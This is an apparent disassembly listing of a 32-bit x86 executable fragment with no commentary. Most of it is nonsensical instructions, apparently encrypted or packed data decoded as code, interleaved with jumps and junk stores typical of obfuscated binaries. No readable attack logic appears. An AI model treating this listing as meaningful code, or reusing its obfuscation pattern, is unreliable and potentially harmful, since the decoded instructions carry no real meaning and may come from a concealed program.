  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433813,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x4337e7,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433813,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43378f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43381b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43379b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x433853,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xd7fa085f
  406b85:	cmp    al,BYTE PTR [edx]
  406b87:	cmp    edi,DWORD PTR [esi+0x7e]
  406b8a:	mov    esp,0xea7e7e7f
  406b8f:	ret    
  406b90:	(bad)  
  406b91:	xchg   esi,eax
  406b92:	fnstsw WORD PTR [ecx]
  406b94:	fild   DWORD PTR [edx]
  406b96:	sbb    eax,0x36f0c22b
  406b9b:	inc    ebx
  406b9c:	inc    edi
  406b9d:	jnp    0x406bb2
  406b9f:	adc    edi,DWORD PTR [eax+edx*2-0x69ee9f23]
  406ba6:	fimul  WORD PTR [esi-0x1e]
  406ba9:	mov    ?,WORD PTR [esi]
  406bab:	push   edx
  406bac:	mov    al,0x69
  406bae:	adc    ah,BYTE PTR [ebx+ecx*8+0xa]
  406bb2:	mov    eax,0xdc3e98f0
  406bb7:	stos   BYTE PTR es:[edi],al
  406bb8:	adc    cl,BYTE PTR [esi+eiz*1-0x32]
  406bbc:	fbstp  TBYTE PTR [esi+0x41]
  406bbf:	xor    dl,bl
  406bc1:	cmp    al,0xcc
  406bc3:	sahf   
  406bc4:	(bad)  
  406bc6:	add    al,0x5f
  406bc8:	and    ebx,DWORD PTR [edx+esi*2+0x7b]
  406bcc:	in     al,dx
  406bcd:	mov    dh,0x58
  406bcf:	adc    dh,dl
  406bd1:	push   ebp
  406bd2:	and    BYTE PTR [esi-0x18c06950],0x19
  406bd9:	icebp  
  406bda:	rep ins BYTE PTR es:[edi],dx
  406bdc:	cdq    
  406bdd:	push   esp
  406bde:	test   edx,ebp
  406be0:	sbb    eax,0xc1ca4e5c
  406be5:	mov    ebp,0xeecde04
  406bea:	jo     0x406bd1
  406bec:	and    ch,ah
  406bee:	pop    eax
  406bef:	mov    fs:0x9ea02a2f,eax
  406bf5:	cmp    dl,BYTE PTR [edi]
  406bf7:	mov    esi,0xc160cc99
  406bfc:	cmp    DWORD PTR [eax-0x239506ff],esi
  406c02:	ds std 
  406c04:	xchg   DWORD PTR [ebp-0x27],edx
  406c07:	(bad)  [esi-0x5c6ea0fe]
  406c0d:	push   es
  406c0e:	or     eax,DWORD PTR [edi-0x1d34592b]
  406c14:	adc    ebx,DWORD PTR ds:0x29c1aa68
  406c1a:	xor    ch,BYTE PTR [edx]
  406c1c:	sub    ebp,DWORD PTR [ebp-0x52]
  406c1f:	nop
  406c20:	jg     0x406bc6
  406c22:	loop   0x406bd1
  406c24:	ret    
  406c25:	(bad)  
  406c26:	push   0xffffff8a
  406c28:	mov    WORD PTR [ecx+ebx*4],gs
  406c2b:	jb     0x406c0f
  406c2d:	adc    al,ah
  406c2f:	lods   al,BYTE PTR ds:[esi]
  406c30:	mov    DWORD PTR [ebx-0x1a1d6482],eax
  406c36:	fistp  WORD PTR [edi-0x13db2ca8]
  406c3c:	ins    BYTE PTR es:[edi],dx
  406c3d:	test   BYTE PTR [edx+0x43],bl
  406c40:	aas    
  406c41:	mov    edx,0x47fb7d38
  406c46:	(bad)  
  406c47:	mov    ch,0x99
  406c49:	or     BYTE PTR [eax],al
  406c4b:	in     al,dx
  406c4c:	lahf   
  406c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c4e:	xor    DWORD PTR [esi+eax*1+0x3dc422dd],ebx
  406c55:	mov    al,BYTE PTR [esi-0x6632bc87]
  406c5b:	push   eax
  406c5c:	mov    DWORD PTR [ebp+0x12d618a5],esi
  406c62:	inc    edx
  406c63:	and    BYTE PTR [edx-0x2e],ah
  406c66:	sbb    al,BYTE PTR [edi-0x45]
  406c69:	jno    0x406c5b
  406c6b:	mov    ch,0x45
  406c6d:	push   0x5b
  406c6f:	xor    ecx,DWORD PTR [edi]
  406c71:	ret    
  406c72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c73:	fcomp  QWORD PTR [edx-0x7313364e]
  406c79:	xor    cl,bh
  406c7b:	inc    esp
  406c7c:	dec    ebp
  406c7d:	into   
  406c7e:	push   0xffffff80
  406c80:	mov    dh,0x17
  406c82:	lds    esi,FWORD PTR [ecx+0x60]
  406c85:	test   al,0xd1
  406c87:	mov    ebp,DWORD PTR [ebx+ecx*4]
  406c8a:	jp     0x406cad
  406c8c:	arpl   WORD PTR [eax-0x378910b],di
  406c92:	cmp    edx,esp
  406c94:	mov    cl,ah
  406c96:	push   ss
  406c97:	jle    0x406c8b
  406c99:	loopne 0x406cd2
  406c9b:	mov    DWORD PTR [edi+0x76],edx
  406c9e:	aaa    
  406c9f:	pop    esi
  406ca0:	adc    eax,0x2a7cdda7
  406ca5:	cmp    DWORD PTR [ebx+ebp*4],ecx
  406ca8:	push   esp
  406ca9:	outs   dx,DWORD PTR ds:[esi]
  406caa:	xor    eax,0xec235752
  406caf:	shr    DWORD PTR [esi],cl
  406cb1:	or     BYTE PTR [edi-0x37],bl
  406cb4:	xor    bh,BYTE PTR [ebp-0x59]
  406cb7:	stos   BYTE PTR es:[edi],al
  406cb8:	xor    edi,DWORD PTR [esp+eiz*2+0x407a283d]
  406cbf:	cwde   
  406cc0:	loope  0x406c5d
  406cc2:	push   edi
  406cc3:	mov    al,ds:0xfd4dc2fb
  406cc8:	call   0x4049:0xabc03c0f
  406ccf:	ss push ebp
  406cd1:	fimul  DWORD PTR [ebx-0x4be7ba23]
  406cd7:	call   0xe15f:0xe5e055f0
  406cde:	mov    ds:0xa3952a3b,al
  406ce3:	push   cs
  406ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ce5:	aas    
  406ce6:	mov    al,0x1
  406ce8:	cmp    al,0xfd
  406cea:	adc    BYTE PTR [esi],ch
  406cec:	xchg   DWORD PTR [ecx],esp
  406cee:	and    DWORD PTR [ebp+0x11],ebx
  406cf1:	retf   
  406cf2:	mov    ah,0xc4
  406cf4:	stc    
  406cf5:	retf   0xbe4c
  406cf8:	dec    ebp
  406cf9:	dec    esp
  406cfa:	adc    cl,BYTE PTR [edx+0x65]
  406cfd:	fwait
  406cfe:	inc    ecx
  406cff:	icebp  
  406d00:	sbb    ecx,ebp
  406d02:	cmp    eax,edi
  406d04:	sbb    al,0x1e
  406d06:	(bad)  
  406d07:	mov    eax,ds:0x53dd883e
  406d0c:	pop    esi
  406d0d:	stos   BYTE PTR es:[edi],al
  406d0e:	mov    dh,0xfd
  406d10:	sbb    cl,BYTE PTR [edx]
  406d12:	xchg   esi,eax
  406d13:	sbb    DWORD PTR [ebx+0x16],0x987bc043
  406d1a:	pusha  
  406d1b:	sbb    eax,0x7cde9a45
  406d20:	cmp    DWORD PTR [ecx],edx
  406d22:	xchg   edx,eax
  406d23:	jmp    0x53d272fc
  406d28:	lock pop eax
  406d2a:	jge    0x406d18
  406d2c:	and    BYTE PTR [edi],ch
  406d2e:	cwde   
  406d2f:	xchg   esi,eax
  406d30:	xchg   ecx,eax
  406d31:	pop    ebx
  406d32:	add    BYTE PTR [ebp+0x5e],dl
  406d35:	scas   al,BYTE PTR es:[edi]
  406d36:	and    BYTE PTR [ecx-0x3e],ah
  406d39:	mov    al,0xca
  406d3b:	inc    ecx
  406d3c:	lahf   
  406d3d:	(bad)  
  406d3e:	stos   DWORD PTR es:[edi],eax
  406d3f:	mov    cs,WORD PTR [ecx]
  406d41:	and    al,0x9e
  406d43:	push   esi
  406d44:	xchg   edi,eax
  406d45:	fwait
  406d46:	mov    ds:0xca7558ea,al
  406d4b:	out    dx,eax
  406d4c:	jp     0x406ce8
  406d4e:	sar    DWORD PTR [esi+eiz*2+0x2b9c133],1
  406d55:	cmp    eax,DWORD PTR [eax]
  406d57:	add    BYTE PTR [ecx+0x4338af1d],al
  406d5d:	add    BYTE PTR [ebx+0x66004337],dl
  406d63:	add    eax,ecx
  406d65:	add    DWORD PTR ds:0x4338a3,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x4337e3,0x43378f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x39
  406d91:	loop   0x406d4c
  406d93:	add    DWORD PTR [eax+0x38],eax
  406d96:	jle    0x406e16
  406d98:	mov    esp,0xed7e7e7f
  406d9d:	ins    DWORD PTR es:[edi],dx
  406d9e:	cmp    ebx,DWORD PTR [edi+eax*4]
  406da1:	iret   
  406da2:	xor    eax,0xd169fb50
  406da7:	mov    ch,0x28
  406da9:	stos   BYTE PTR es:[edi],al
  406daa:	pop    DWORD PTR [eax+0x52b37300]
  406db0:	jmp    0xfe19ad5e
  406db5:	push   edx
  406db6:	lods   eax,DWORD PTR ds:[esi]
  406db7:	inc    ebp
  406db8:	stc    
  406db9:	cs retf 0xc06a
  406dbd:	shl    BYTE PTR [ebx],0x42
  406dc0:	sbb    dh,BYTE PTR [ebx-0x37d99755]
  406dc6:	scas   al,BYTE PTR es:[edi]
  406dc7:	sbb    BYTE PTR [ebp+0x72eabbdd],ah
  406dcd:	repnz add dl,BYTE PTR [esi]
  406dd0:	shr    DWORD PTR [edx+0x78d8cf77],1
  406dd6:	push   ds
  406dd7:	sahf   
  406dd8:	loopne 0x406ddf
  406dda:	aaa    
  406ddb:	imul   BYTE PTR [ecx+0x56c49d7a]
  406de1:	sub    eax,0x92dcb88a
  406de6:	or     ah,cl
  406de8:	sub    al,0xe4
  406dea:	xchg   DWORD PTR [edx+0x8],esi
  406ded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dee:	xchg   BYTE PTR [ebx+0x4e],ah
  406df1:	push   es
  406df2:	pop    DWORD PTR [ecx+0x5d]
  406df5:	in     eax,dx
  406df6:	pop    ss
  406df7:	inc    eax
  406df8:	push   ds
  406df9:	loopne 0x406e4c
  406dfb:	adc    BYTE PTR [eax+0x4a],al
  406dfe:	inc    ebp
  406dff:	push   ss
  406e00:	sbb    bh,BYTE PTR [eax]
  406e02:	pop    ecx
  406e03:	dec    edx
  406e04:	lock icebp 
  406e06:	int    0x71
  406e08:	push   edx
  406e09:	ins    BYTE PTR es:[edi],dx
  406e0a:	xlat   BYTE PTR ds:[ebx]
  406e0b:	add    DWORD PTR [edi+eax*1],ebx
  406e0e:	ins    DWORD PTR es:[edi],dx
  406e0f:	mov    DWORD PTR [ebp+0x3ba42f70],ebp
  406e15:	sti    
  406e16:	mov    edx,0x517b8bff
  406e1b:	fisub  DWORD PTR [esi]
  406e1d:	inc    ecx
  406e1e:	cwde   
  406e1f:	shl    DWORD PTR [ebx],cl
  406e21:	pop    edi
  406e22:	mov    ch,0xb6
  406e24:	sbb    edi,edi
  406e26:	inc    eax
  406e27:	std    
  406e28:	jae    0x406e05
  406e2a:	push   eax
  406e2b:	daa    
  406e2c:	test   eax,0x1af41114
  406e31:	loopne 0x406e19
  406e33:	in     eax,dx
  406e34:	push   ebp
  406e35:	and    ebx,esi
  406e37:	cmp    DWORD PTR [ecx-0x61bc2fb9],ebx
  406e3d:	xchg   ecx,eax
  406e3e:	imul   edi,esi,0xffffffb3
  406e41:	and    al,0x6c
  406e43:	sbb    al,BYTE PTR [edx+0x29836076]
  406e49:	out    dx,al
  406e4a:	pop    ebx
  406e4b:	fxch   st(7)
  406e4d:	mov    ebp,0x7964ef37
  406e52:	adc    DWORD PTR [ebp-0x1e3c2fa2],0xffffff83
  406e59:	dec    ebx
  406e5a:	xor    BYTE PTR [ecx-0x7],cl
  406e5d:	jmp    0xb0e9ddc8
  406e62:	aaa    
  406e63:	jle    0x406e9f
  406e65:	popf   
  406e66:	cmp    eax,edi
  406e68:	nop
  406e69:	cdq    
  406e6a:	iret   
  406e6b:	mov    edx,0xd630fd54
  406e70:	sub    esp,ecx
  406e72:	push   esi
  406e73:	test   al,0xc1
  406e75:	div    DWORD PTR [ebx-0x324a788f]
  406e7b:	retf   0xfbed
  406e7e:	dec    esi
  406e7f:	jae    0x406ea0
  406e81:	inc    ebx
  406e82:	mov    bl,0x43
  406e84:	loop   0x406e64
  406e86:	jo     0x406e11
  406e88:	mov    ebp,0x41e2bfee
  406e8d:	xor    eax,0x69a5f989
  406e92:	daa    
  406e93:	icebp  
  406e94:	cmp    bh,BYTE PTR [ecx+0x4a]
  406e97:	cmp    DWORD PTR [esp+ebx*8+0x40952483],0x33a1e16b
  406ea2:	lds    esp,FWORD PTR [edi+eax*1+0x60599b32]
  406ea9:	arpl   WORD PTR [esi-0x38],sp
  406eac:	lea    edx,[esi-0x2f]
  406eaf:	inc    edx
  406eb0:	cmp    esp,DWORD PTR [eax]
  406eb2:	into   
  406eb3:	in     al,0x5
  406eb5:	jl     0x406e4e
  406eb7:	mov    gs,WORD PTR [edi]
  406eb9:	scas   eax,DWORD PTR es:[edi]
  406eba:	lds    ecx,FWORD PTR [eax+0x7e2a9027]
  406ec0:	and    al,0x18
  406ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ec4:	imul   eax,DWORD PTR [edx],0xcfb9b800
  406eca:	shl    esi,cl
  406ecc:	aam    0xe3
  406ece:	or     eax,0x73b7eb66
  406ed3:	inc    eax
  406ed4:	sub    eax,0x1f59816f
  406ed9:	std    
  406eda:	shr    esp,1
  406edc:	xchg   esp,eax
  406edd:	int3   
  406ede:	stos   DWORD PTR es:[edi],eax
  406edf:	mov    ecx,0xedf77718
  406ee4:	sbb    ah,ah
  406ee6:	push   esp
  406ee7:	and    edi,DWORD PTR [ecx+edi*8-0x651d168]
  406eee:	imul   DWORD PTR [esi]
  406ef0:	fiadd  WORD PTR [eax+eax*2-0x7e557e4a]
  406ef7:	outs   dx,BYTE PTR ds:[esi]
  406ef8:	pop    ss
  406ef9:	rcr    BYTE PTR [esi+0x60],1
  406efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406efd:	cmp    eax,0x5950e10
  406f02:	and    BYTE PTR [edx+0x18],0xa
  406f06:	sub    DWORD PTR [ebx-0x1ad1f33f],edi
  406f0c:	test   DWORD PTR [edi],0xd8124c2b
  406f12:	loope  0x406f07
  406f14:	scas   al,BYTE PTR es:[edi]
  406f15:	mov    bh,0x8a
  406f17:	jno    0x406eb3
  406f19:	push   ebp
  406f1a:	jmp    0x6078:0xadcaaf19
  406f21:	dec    edx
  406f22:	jmp    0x406f68
  406f24:	icebp  
  406f25:	aam    0xa6
  406f27:	imul   ecx,DWORD PTR [edx+ecx*4-0x56],0x791817fa
  406f2f:	cmp    esp,edx
  406f31:	enter  0x607c,0x4c
  406f35:	jle    0x406f31
  406f37:	push   eax
  406f38:	push   edi
  406f39:	jae    0x406fb0
  406f3b:	outs   dx,DWORD PTR ds:[esi]
  406f3c:	idiv   ebp
  406f3e:	xchg   ebp,eax
  406f3f:	scas   al,BYTE PTR es:[edi]
  406f40:	mov    cl,0x4b
  406f42:	fist   WORD PTR [ebp+0x4d]
  406f45:	push   DWORD PTR [ecx]
  406f47:	enter  0x606a,0x86
  406f4b:	out    0xac,eax
  406f4d:	mov    ecx,0x22711c5e
  406f52:	xchg   ebx,eax
  406f53:	ins    DWORD PTR es:[edi],dx
  406f54:	sub    eax,esi
  406f56:	cmp    DWORD PTR [esi+0x61],edi
  406f59:	xchg   esi,eax
  406f5a:	xchg   ebp,eax
  406f5b:	or     DWORD PTR [edx],ebx
  406f5d:	cs not eax
  406f60:	and    DWORD PTR ds:0x43378f,0x4337d3
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x6fdef7de
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xcc7e7e7f
  406f9f:	mov    ecx,0x78121f2a
  406fa4:	int3   
  406fa5:	(bad)  
  406fa6:	arpl   WORD PTR [eax],di
  406fa8:	jne    0x407026
  406faa:	or     BYTE PTR [ebx+0x7210bbd3],al
  406fb0:	out    dx,eax
  406fb1:	lahf   
  406fb2:	xor    eax,0xb06cba0
  406fb7:	(bad)  
  406fb8:	sbb    ebx,DWORD PTR [eax+0x2be4b46]
  406fbe:	hlt    
  406fbf:	dec    esp
  406fc0:	jb     0x406f9e
  406fc2:	arpl   bx,di
  406fc4:	ja     0x40703a
  406fc6:	arpl   WORD PTR [edx+0x1c],dx
  406fc9:	push   cs
  406fca:	sub    al,0x8a
  406fcc:	add    eax,0xfc622da1
  406fd1:	test   dh,bl
  406fd3:	inc    esp
  406fd4:	lea    edx,[ebx]
  406fd6:	das    
  406fd7:	popf   
  406fd8:	cmovs  ecx,DWORD PTR [esi]
  406fdb:	cmp    ebp,esp
  406fdd:	es fwait
  406fdf:	pushf  
  406fe0:	sbb    cl,BYTE PTR [edx+0x77a816b2]
  406fe6:	sbb    al,bl
  406fe8:	sbb    bl,ch
  406fea:	call   0x647d:0xa9448131
  406ff1:	jnp    0x407059
  406ff3:	lds    eax,FWORD PTR [bx+di+0x75]
  406ff7:	pushf  
  406ff8:	(bad)  
  406ff9:	cmp    BYTE PTR [esi+0x15a9beb6],0x44
  407000:	mov    ds:0x825218c5,al
  407005:	(bad)  
  407006:	stos   DWORD PTR es:[edi],eax
  407007:	aam    0x5e
  407009:	into   
  40700a:	adc    DWORD PTR [ebp-0x7f],esp
  40700d:	mov    dh,BYTE PTR [esi-0x2050dc63]
  407013:	jmp    0x1972:0xad621d07
  40701a:	add    edi,DWORD PTR [ecx-0xa4cba63]
  407020:	jg     0x406fab
  407022:	pusha  
  407023:	mov    WORD PTR [edx],ds
  407025:	sub    BYTE PTR [edi-0x19e31611],al
  40702b:	add    al,0x5a
  40702d:	jnp    0x407070
  40702f:	push   ebp
  407030:	adc    esp,DWORD PTR [edi]
  407032:	xor    BYTE PTR [edi+0x71],al
  407035:	lds    ecx,FWORD PTR [ecx+0x16adc28a]
  40703b:	pop    es
  40703c:	cmp    eax,0xeb1da6e9
  407041:	add    dh,BYTE PTR [ecx]
  407043:	aad    0xed
  407045:	(bad)  
  407046:	shl    DWORD PTR [esi],0xfd
  407049:	pushf  
  40704a:	xlat   BYTE PTR ds:[ebx]
  40704b:	mov    al,ds:0x1dac79ce
  407050:	int    0xc1
  407052:	icebp  
  407053:	test   al,0x46
  407055:	js     0x40703d
  407057:	jg     0x407014
  407059:	push   cs
  40705a:	adc    BYTE PTR [ecx+0x74],cl
  40705d:	pop    es
  40705e:	push   es
  40705f:	fs push ss
  407061:	idiv   edx
  407063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407064:	push   0x724ed428
  407069:	inc    esi
  40706a:	sub    BYTE PTR [eax],bl
  40706c:	adc    eax,0xc0d8f88b
  407071:	aam    0xd8
  407073:	sub    edi,edi
  407075:	xor    DWORD PTR [ebp-0x62d43060],edx
  40707b:	test   dl,bh
  40707d:	and    BYTE PTR ds:0xcba20057,ch
  407083:	inc    eax
  407084:	test   bl,dl
  407086:	in     eax,dx
  407087:	add    esi,eax
  407089:	push   ss
  40708a:	test   eax,0xed5f4128
  40708f:	retf   
  407090:	ss dec ecx
  407092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407093:	or     DWORD PTR [edx-0x6a],edi
  407096:	lahf   
  407097:	and    ebx,DWORD PTR [ebx-0x8c85158]
  40709d:	dec    edi
  40709e:	repz fadd DWORD PTR [esi-0x55c04cb4]
  4070a5:	dec    eax
  4070a6:	sub    DWORD PTR [edx],esp
  4070a8:	adc    edi,DWORD PTR [eax-0x609f2a82]
  4070ae:	arpl   WORD PTR [ebx-0x7962853],di
  4070b4:	nop
  4070b5:	sbb    eax,0x6c536179
  4070ba:	retf   
  4070bb:	mov    ebx,0xc10c1945
  4070c0:	aam    0x17
  4070c2:	lods   al,BYTE PTR ds:[esi]
  4070c3:	inc    ecx
  4070c4:	test   BYTE PTR [eax],ah
  4070c6:	aad    0x98
  4070c8:	cld    
  4070c9:	addr16 cmc 
  4070cb:	inc    edx
  4070cc:	dec    esi
  4070cd:	dec    ecx
  4070ce:	push   ecx
  4070cf:	es sub DWORD PTR gs:[ecx],0x15
  4070d4:	loop   0x407110
  4070d6:	dec    edx
  4070d8:	adc    cl,0xf6
  4070db:	loope  0x407127
  4070dd:	pop    ss
  4070de:	mov    esi,0xc59a270d
  4070e3:	mov    esp,0x8829ced3
  4070e9:	scas   eax,DWORD PTR es:[edi]
  4070ea:	add    eax,0xaff89fc6
  4070ef:	push   edi
  4070f0:	inc    esp
  4070f1:	loopne 0x4070a1
  4070f3:	xlat   BYTE PTR ds:[ebx]
  4070f4:	fnstenv [ebx+ebx*4+0x1d]
  4070f8:	push   edx
  4070f9:	mov    al,ds:0xe0aa9a4b
  4070fe:	mov    ebx,DWORD PTR [ecx+0x549baf46]
  407104:	fld    st(2)
  407106:	and    al,0x92
  407108:	cdq    
  407109:	dec    esp
  40710a:	sub    al,0x31
  40710c:	push   0xffffffed
  40710e:	in     eax,dx
  40710f:	adc    BYTE PTR [ebp-0x3f613dbd],dl
  407115:	mov    ds:0xe148f37a,eax
  40711a:	and    edi,DWORD PTR [ecx+0x7e]
  40711d:	mov    ebx,0xf38a8bca
  407122:	loopne 0x4070e7
  407124:	test   al,0x2e
  407126:	imul   esi,esp,0xffffff95
  407129:	cmp    BYTE PTR [eax+0x55],dh
  40712c:	call   0xa1fc:0x1b70a4ef
  407133:	stos   BYTE PTR es:[edi],al
  407134:	sub    al,0xb3
  407136:	mov    esp,0x725250e5
  40713b:	jmp    0x4c06:0xbb1af43a
  407142:	frstor [esp+ebx*8+0x56]
  407146:	je     0x2b8911a0
  40714c:	dec    ebx
  40714d:	std    
  40714e:	out    0x6c,eax
  407150:	ror    ebp,cl
  407152:	jecxz  0x407115
  407154:	push   ss
  407155:	or     DWORD PTR [ebp+ebx*8-0x4f],edx
  407159:	js     0x4071b3
  40715b:	fsub   QWORD PTR [edi+edx*8]
  40715e:	push   ebp
  40715f:	mov    dh,0xff
  407161:	jne    0x40716b
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	outs   dx,DWORD PTR ds:[esi]
  40717c:	sbb    eax,0xc4cccc22
  407181:	jle    0x407201
  407183:	mov    esp,0x237e7e7f
  407188:	mov    bl,0x99
  40718a:	call   0x2cde:0x3f7f03a0
  407191:	or     al,0xec
  407193:	push   0xffffffa6
  407195:	inc    eax
  407196:	icebp  
  407197:	femms  
  407199:	push   es
  40719a:	ja     0x407190
  40719c:	vpaddq ymm3,ymm0,YMMWORD PTR [ecx+0x42e87803]
  4071a4:	dec    esi
  4071a5:	out    dx,eax
  4071a6:	mov    bl,0xbf
  4071a8:	cs jge 0x407212
  4071ab:	mov    ebx,0x94ccd433
  4071b0:	outs   dx,DWORD PTR ds:[esi]
  4071b1:	jl     0x4071c9
  4071b3:	mov    eax,ds:0xc7f02dcc
  4071b8:	sub    BYTE PTR [ebp+0x76598407],ch
  4071be:	and    DWORD PTR [edi+eax*8-0x3b7f97a1],edx
  4071c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071c6:	(bad)  
  4071c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071c8:	mov    eax,ds:0x6e3706bb
  4071cd:	adc    al,0x2c
  4071cf:	lea    eax,[esi]
  4071d1:	in     eax,0xca
  4071d3:	push   ecx
  4071d4:	ret    
  4071d5:	sub    esi,eax
  4071d7:	dec    ebx
  4071d8:	mov    ds:0xb7711cd0,eax
  4071dd:	and    bl,ah
  4071df:	cmp    BYTE PTR [eax+ecx*1],cl
  4071e2:	int3   
  4071e3:	mov    dl,0xc4
  4071e5:	dec    edx
  4071e6:	sbb    BYTE PTR [edi+0x4da1142f],ah
  4071ec:	mov    al,ds:0x8dc31b06
  4071f1:	dec    ecx
  4071f2:	dec    esi
  4071f3:	lock mov bh,cl
  4071f6:	arpl   ax,sp
  4071f8:	jle    0x40717b
  4071fa:	push   ss
  4071fb:	mov    bh,BYTE PTR [edx+0x20a66723]
  407201:	pop    ebx
  407202:	mov    eax,0x393ef2be
  407207:	pop    esp
  407208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407209:	nop
  40720a:	mov    edi,0x39a8694c
  40720f:	mov    ebx,0x8a521d79
  407214:	xor    BYTE PTR [esi-0x1],dl
  407217:	xchg   edi,eax
  407218:	sbb    esi,DWORD PTR [edi-0x1039c921]
  40721e:	popa   
  40721f:	and    edx,DWORD PTR [ebx+esi*1+0x24074859]
  407226:	scas   al,BYTE PTR es:[edi]
  407227:	inc    esp
  407228:	aad    0xf2
  40722a:	aas    
  40722b:	sbb    eax,0x9b79f78f
  407230:	mov    edx,0x87647642
  407235:	inc    edi
  407236:	jmp    0x6181:0x3cd51036
  40723d:	jp     0x407205
  40723f:	jg     0x4071c2
  407241:	fmul   DWORD PTR [ecx-0x5ebaf99e]
  407247:	ret    
  407248:	lock (bad) [ebx]
  40724b:	and    edi,esp
  40724d:	inc    ecx
  40724e:	jmp    0x407248
  407250:	fdivr  QWORD PTR ds:0x62aa0bd5
  407256:	cmc    
  407257:	push   ebx
  407258:	adc    ah,BYTE PTR [ebx+0x38a15e30]
  40725e:	out    dx,al
  40725f:	in     eax,0xad
  407261:	xor    BYTE PTR [esi+0x6b50219c],0x1a
  407268:	hlt    
  407269:	popf   
  40726a:	ins    BYTE PTR es:[edi],dx
  40726b:	fs inc eax
  40726d:	cwde   
  40726e:	std    
